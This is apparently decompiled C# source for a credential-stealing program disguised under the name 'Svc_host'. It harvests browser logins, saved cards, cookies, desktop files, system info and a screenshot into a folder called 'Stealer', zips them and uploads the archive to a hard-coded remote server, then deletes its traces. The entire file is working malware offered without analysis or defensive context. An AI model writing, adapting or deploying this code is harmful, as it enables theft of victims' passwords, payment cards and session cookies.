using System;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Svc_host;

internal class Program
{
	public static string BasePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Stealer";

	public static string LoginsPath = BasePath + "\\Logins";

	public static string CardsPath = BasePath + "\\Cards";

	public static string CookiesPath = BasePath + "\\Cookies";

	public static string DesktopFilesPath = BasePath + "\\Desktop";

	public static string ZipPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/" + PCInfo.GetPublicIP() + ".zip";

	public static string userId = "";

	private static void Main()
	{
		RegistryKey currentUser = Registry.CurrentUser;
		BrowserInfoReader browserInfoReader = new BrowserInfoReader();
		if (!Directory.Exists(BasePath))
		{
			Directory.CreateDirectory(BasePath);
		}
		if (!Directory.Exists(LoginsPath))
		{
			Directory.CreateDirectory(LoginsPath);
		}
		if (!Directory.Exists(CardsPath))
		{
			Directory.CreateDirectory(CardsPath);
		}
		if (!Directory.Exists(CookiesPath))
		{
			Directory.CreateDirectory(CookiesPath);
		}
		if (!Directory.Exists(DesktopFilesPath))
		{
			Directory.CreateDirectory(DesktopFilesPath);
		}
		browserInfoReader.GetLogins(LoginsPath);
		browserInfoReader.GetCards(CardsPath);
		browserInfoReader.GetCookies(CookiesPath);
		DesktopGrabber.Grab(DesktopFilesPath);
		PCInfo.SaveInfo(BasePath);
		Screenshot();
		ZipFile.CreateFromDirectory(BasePath, ZipPath, CompressionLevel.Optimal, includeBaseDirectory: true);
		Upload("http://178.154.251.1/log.php", File.ReadAllBytes(ZipPath), Registry.CurrentUser.GetValue("user_svc", "5")!.ToString()).Wait();
		File.Delete(ZipPath);
		Directory.Delete(BasePath, recursive: true);
		currentUser.SetValue("started", "true");
	}

	private static async Task Upload(string actionUrl, byte[] paramFileBytes, string id)
	{
		HttpContent content = new ByteArrayContent(paramFileBytes);
		StringContent content2 = new StringContent(id);
		IpInfo userCountryByIp = PCInfo.GetUserCountryByIp(PCInfo.GetPublicIP());
		using HttpClient client = new HttpClient();
		using MultipartFormDataContent formData = new MultipartFormDataContent();
		formData.Add(content, "userfile", $"{userCountryByIp.Ip}_{userCountryByIp.Country}_{new Random().Next(1, 234)}.zip");
		formData.Add(content2, "user_id");
		Console.Write((await client.PostAsync(actionUrl, formData)).Content.ReadAsStringAsync().Result);
	}

	public static void Screenshot()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics.FromImage((Image)(object)val).CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
		((Image)val).Save(BasePath + "/Screenshot.png");
	}
}
